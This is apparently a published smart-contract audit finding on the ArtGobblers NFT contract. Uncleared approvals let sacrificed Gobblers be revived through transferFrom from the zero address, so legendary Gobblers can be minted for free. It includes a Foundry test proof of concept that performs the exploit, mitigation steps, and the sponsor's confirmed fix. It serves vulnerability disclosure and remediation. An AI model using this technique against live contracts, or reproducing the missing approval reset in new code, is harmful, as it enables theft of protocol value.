[H-01] Can Recover Gobblers Burnt In Legendary Mint
Submitted by philogy, also found by auditor0517, bin2chen, cccz, hansfriese, hyh, KIntern_NA, ladboy233, m9800, pauliax, pedroais, ronnyx2017, wagmi, wastewa, and zzykxx
ArtGobblers.sol#L432ArtGobblers.sol#L890
Allows users to mint legendary Gobblers for free assuming they have the necessary amount of Gobblers to begin with. This is achieved by “reviving” sacrificed Gobblers after having calledmintLegendaryGobbler.
Severity Justification
This vulnerability allows the violation of the fundamental mechanics of in-scope contracts, allowing buyers to purchase legendary Gobblers at almost no cost outside of temporary liquidity requirements which can be reduced via the use of NFT flashloans.
Proof of Concept
Add the following code to theArtGobblersTestcontract intest/ArtGobblers.t.soland run the test viaforge test --match-test testCanReuseSacrificedGobblers -vvv:
functiontestCanReuseSacrificedGobblers()public{addressuser=users[0];// setup legendary mintuint256startTime=block.timestamp+30days;vm.warp(startTime);mintGobblerToAddress(user,gobblers.LEGENDARY_AUCTION_INTERVAL());uint256cost=gobblers.legendaryGobblerPrice();assertEq(cost,69);setRandomnessAndReveal(cost,"seed");for(uint256curId=1;curId<=cost;curId++) {ids.push(curId);assertEq(gobblers.ownerOf(curId),users[0]);}// do token approvals for vulnerability exploitvm.startPrank(user);for(uint256i=0;i<ids.length;i++) {gobblers.approve(user,ids[i]);}vm.stopPrank();// mint legendaryvm.prank(user);uint256mintedLegendaryId=gobblers.mintLegendaryGobbler(ids);// confirm user owns legendaryassertEq(gobblers.ownerOf(mintedLegendaryId),user);// show that contract initially thinks tokens are burntfor(uint256i=0;i<ids.length;i++) {hevm.expectRevert("NOT_MINTED");gobblers.ownerOf(ids[i]);}// "revive" burnt tokens by transferring from zero address with approval// which was not resetvm.startPrank(user);for(uint256i=0;i<ids.length;i++) {gobblers.transferFrom(address(0),user,ids[i]);assertEq(gobblers.ownerOf(ids[i]),user);}vm.stopPrank();}
Recommended Mitigation Steps
Ensure token ownership is reset in the for-loop of themintLegendaryGobblermethod. Alternatively to reduce the gas cost ofmintLegendaryGobblerby saving on the approval deletion, simply check thefromaddress intransferFrom, revert if it’saddress(0). Note that the latter version would also require changing thegetApprovedview method such that it checks the owner of the token and returns the zero-address if the owner is zero, otherwise thegetApprovedmethod would return the old owner after the underlying Gobbler was sacrificed.
FrankieIsLost (Art Gobblers) confirmed and commented:
Great find. Agree with severity. Here is the fix:https://github.com/artgobblers/art-gobblers/pull/151
Alex the Entreprenerd (judge) commented:
The Warden has shown how, because the approvals field was not cleared, an owner could “bring back a Gobbler from the dead”, allowing them to mint legendary Gobblers for free.The sponsor has mitigated the issue by clearing thegetApprovedfield.Because this finding breaks protocol invariants, and would allow to sidestep the cost to mint a Legendary Gobbler, I agree with High Severity.